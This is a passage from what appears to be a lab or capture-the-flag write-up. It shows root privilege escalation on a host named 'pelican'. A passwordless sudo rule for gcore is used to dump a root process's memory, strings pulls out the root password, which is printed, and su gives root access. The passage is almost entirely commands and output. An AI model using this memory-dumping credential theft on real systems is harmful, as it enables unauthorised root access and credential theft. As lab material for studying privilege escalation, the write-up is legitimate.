# 6 privesc > root

```
# the cronjob does not help as it makes /opt/* directory owned by charles
# the sudo -l and the SUID binary does look interesting

Using https://gtfobins.github.io/gtfobins/gcore/#sudo
# generate core dumps of running processes
# often contains sensitive information; filtered with strings to search for sensitive information

charles@pelican:~/k$ sudo -l
Matching Defaults entries for charles on pelican:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore
charles@pelican:~/k$ ps aux --forest | grep '/usr/bin/password-store'
root       493  0.0  0.0   2276   108 ?        Ss   13:44   0:00 /usr/bin/password-store
root     13095  0.0  0.0   2276  1248 ?        Ss   14:19   0:00 /usr/bin/password-store
charles  15758  0.0  0.0   6208   896 pts/0    S+   14:28   0:00          \_ grep /usr/bin/password-store

charles@pelican:~/k$ sudo /usr/bin/gcore 493
0x00007f40ff4dd6f4 in __GI___nanosleep (requested_time=requested_time@entry=0x7ffc48e50c90, remaining=remaining@entry=0x7ffc48e50c90) at ../sysdeps/unix/sysv/linux/nanosleep.c:28
28      ../sysdeps/unix/sysv/linux/nanosleep.c: No such file or directory.
Saved corefile core.493
[Inferior 1 (process 493) detached]

charles@pelican:~/k$ strings core.493
[truncated]
001 Password: root:
ClogKingpinInning731

charles@pelican:~/k$ su root
Password:
root@pelican:/home/charles/k# whoami;id;hostname;uname -a
root
uid=0(root) gid=0(root) groups=0(root)
pelican
Linux pelican 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux
```
